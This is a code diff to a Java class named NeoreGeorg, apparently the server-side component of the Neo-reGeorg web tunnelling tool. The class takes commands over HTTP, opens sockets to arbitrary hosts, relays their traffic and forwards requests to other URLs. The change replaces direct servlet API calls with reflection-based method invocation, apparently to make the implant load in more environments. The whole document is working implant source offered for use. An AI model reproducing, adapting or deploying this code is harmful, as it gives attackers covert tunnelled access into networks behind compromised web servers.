@@ -1,8 +1,5 @@
-import javax.servlet.ServletContext;
-import javax.servlet.ServletInputStream;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
 import java.io.*;
+import java.lang.reflect.Method;
 import java.net.*;
 import java.util.*;
 import java.nio.ByteBuffer;
@@ -12,7 +9,7 @@ import java.security.cert.X509Certificate;
 import javax.net.ssl.*;
 
 /**
- * @Modifier c0ny1, L
+ * @Modifier c0ny1, L, BeichenDream
  * @CreateDate 2021-08-17
  * @Description 将Neo-reGeorg jsp 服务端改为java代码，提高兼容性
  */
@@ -26,8 +23,8 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
     public boolean equals(Object obj) {
         try {
             Object[] args                = (Object[]) obj;
-            HttpServletRequest request   = (HttpServletRequest) args[0];
-            HttpServletResponse response = (HttpServletResponse) args[1];
+            Object request   = args[0];
+            Object response = args[1];
             en                           = (char[])  args[2];
             de                           = (byte[])  args[3];
             int HTTPCODE                 = (Integer) args[4];
@@ -46,15 +43,16 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
             int REDIRECTURL   = 8;
             int FORCEREDIRECT = 9;
 
-            ServletContext application = request.getSession().getServletContext();
-            Writer out = response.getWriter();
+
+            Object application = invokeMethod(invokeMethod(request,"getSession",new Object[0]),"getServletContext",new Object[0]);
+            Writer out = (Writer) invokeMethod(response,"getWriter",new Object[0]);
 
             Object[] info  = new Object[40];
             Object[] rinfo = new Object[40];
             try {
-                if (request.getContentLength() != -1) {
+                if (((int)(Integer)(invokeMethod(request,"getContentLength",new Object[0]))) != -1) {
                     String inputData = "";
-                    InputStream in = request.getInputStream();
+                    InputStream in = (InputStream) invokeMethod(request,"getInputStream",new Object[0]);
                     while ( true ){
                         int buffLen = in.available();
                         if (buffLen == -1)
@@ -71,7 +69,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                 out.write(new String(b64de(GeorgHello)));
                 out.flush();
                 out.close();
-                if ( true ) return false; // exit
+                return false; // exit
             }
 
             String rUrl = (String) info[REDIRECTURL];
@@ -81,8 +79,8 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                 if (force.compareTo("TRUE") == 0 || !islocal(rUrl)){
                     info[REDIRECTURL] = null;
                     info[FORCEREDIRECT] = null;
-                    response.reset();
-                    String method = request.getMethod();
+                    invokeMethod(response,"reset",new Object[0]);
+                    String method = (String) invokeMethod(request,"getMethod",new Object[0]);
                     URL u = new URL(rUrl);
                     HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                     conn.setRequestMethod(method);
@@ -99,15 +97,15 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                     // conn.setConnectTimeout(200);
                     // conn.setReadTimeout(200);
 
-                    Enumeration enu = request.getHeaderNames();
+                    Enumeration enu = (Enumeration) invokeMethod(request,"getHeaderNames",new Object[0]);
                     List<String> keys = Collections.list(enu);
                     Collections.reverse(keys);
                     for (String key : keys){
-                        String value=request.getHeader(key);
+                        String value = (String) invokeMethod(request,"getHeader",new Object[]{key});
                         conn.setRequestProperty(headerkey(key), value);
                     }
 
-                    if (request.getContentLength() != -1){
+                    if (((int)(Integer)(invokeMethod(request,"getContentLength",new Object[0]))) != -1){
                         OutputStream output;
                         try{
                             output = conn.getOutputStream();
@@ -125,7 +123,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                     for (String key : conn.getHeaderFields().keySet()) {
                         if (key != null && !key.equalsIgnoreCase("Content-Length") && !key.equalsIgnoreCase("Transfer-Encoding")){
                             String value = conn.getHeaderField(key);
-                            response.setHeader(key, value);
+                            invokeMethod(response,"setHeader",new Object[]{key, value});
                         }
                     }
 
@@ -135,7 +133,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                     } else {
                         hin = conn.getErrorStream();
                         if (hin == null){
-                            response.setStatus(HTTPCODE);
+                            invokeMethod(response,"setStatus",new Object[]{HTTPCODE});
                             return false;
                         }
                     }
@@ -148,9 +146,9 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                         System.arraycopy(buffer, 0, data, 0, i);
                         baos.write(data);
                     }
-                    String responseBody = new String(baos.toByteArray());
-                    response.addHeader("Content-Length", Integer.toString(responseBody.length()));
-                    response.setStatus(conn.getResponseCode());
+                    String responseBody = baos.toString();
+                    invokeMethod(response,"addHeader",new Object[]{"Content-Length", Integer.toString(responseBody.length())});
+                    invokeMethod(response,"setStatus",new Object[]{conn.getResponseCode()});
                     out.write(responseBody.trim());
                     out.flush();
                     out.close();
@@ -158,9 +156,8 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                     if ( true ) return false; // exit
                 }
             }
-
-            response.resetBuffer();
-            response.setStatus(HTTPCODE);
+            invokeMethod(response,"resetBuffer",new Object[0]);
+            invokeMethod(response,"setStatus",new Object[]{HTTPCODE});
             String cmd = (String) info[CMD];
             if (cmd != null) {
                 String mark = (String) info[MARK];
@@ -171,21 +168,21 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                         SocketChannel socketChannel = SocketChannel.open();
                         socketChannel.socket().connect(new InetSocketAddress(target, port), 3000); // set timeout 3 seconds, default 120 seconds
                         socketChannel.configureBlocking(false);
-                        application.setAttribute(mark, socketChannel);
+                        invokeMethod2(application,"setAttribute",new Class[]{String.class,Object.class},new Object[]{mark, socketChannel});
                         rinfo[STATUS] = "OK";
                     } catch (Exception e) {
                         rinfo[STATUS] = "FAIL";
                         rinfo[ERROR] = e.toString();
                     }
                 } else if (cmd.compareTo("DISCONNECT") == 0) {
-                    SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
+                    SocketChannel socketChannel = (SocketChannel)invokeMethod(application,"getAttribute",new Object[]{mark});
                     try{
                         socketChannel.socket().close();
                     } catch (Exception e) {
                     }
-                    application.removeAttribute(mark);
+                    invokeMethod(application,"removeAttribute",new Object[]{mark});
                 } else if (cmd.compareTo("READ") == 0){
-                    SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
+                    SocketChannel socketChannel = (SocketChannel)invokeMethod(application,"getAttribute",new Object[]{mark});
                     try{
                         if ( socketChannel != null ) {
                             ByteBuffer buf = ByteBuffer.allocate(READBUF);
@@ -213,7 +210,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                     }
 
                 } else if (cmd.compareTo("FORWARD") == 0){
-                    SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
+                    SocketChannel socketChannel =(SocketChannel)invokeMethod(application,"getAttribute",new Object[]{mark});
                     try {
                         byte[] writeData = (byte[]) info[DATA];
                         ByteBuffer buf = ByteBuffer.allocate(writeData.length);
@@ -406,6 +403,30 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
         return buf.toByteArray();
     }
 
+    public static Object invokeMethod(Object obj, String methodName,Object[] args) throws Exception {
+        Class[] argTypes = new Class[args.length];
+        for (int i = 0; i < args.length; i++) {
+            Class argType = args[i].getClass();
+            if(Integer.class.isAssignableFrom(argType)){
+                argType = int.class;
+            }else if(Long.class.isAssignableFrom(argType)){
+                argType = long.class;
+            }else if(Short.class.isAssignableFrom(argType)){
+                argType = short.class;
+            }
+            argTypes[i] = argType;
+        }
+        return invokeMethod2(obj,methodName,argTypes,args);
+    }
+    public static Object invokeMethod2(Object obj, String methodName,Class[] argTypes,Object[] args) throws Exception {
+        Class clazz = obj.getClass();
+        Method method = clazz.getMethod(methodName,argTypes);
+        if (!method.isAccessible()){
+            method.setAccessible(true);
+        }
+        return method.invoke(obj,args);
+    }
+
 
     public static byte[] randBytes(int min, int max) {
         Random r = new Random();
@@ -419,9 +440,9 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
     public static int bytesToInt(byte[] bytes) {
         int i;
         i =   (  bytes[3] & 0xff )
-            | (( bytes[2] & 0xff ) << 8 )
-            | (( bytes[1] & 0xff ) << 16)
-            | (( bytes[0] & 0xff ) << 24);
+                | (( bytes[2] & 0xff ) << 8 )
+                | (( bytes[1] & 0xff ) << 16)
+                | (( bytes[0] & 0xff ) << 24);
         return i;
     }
 
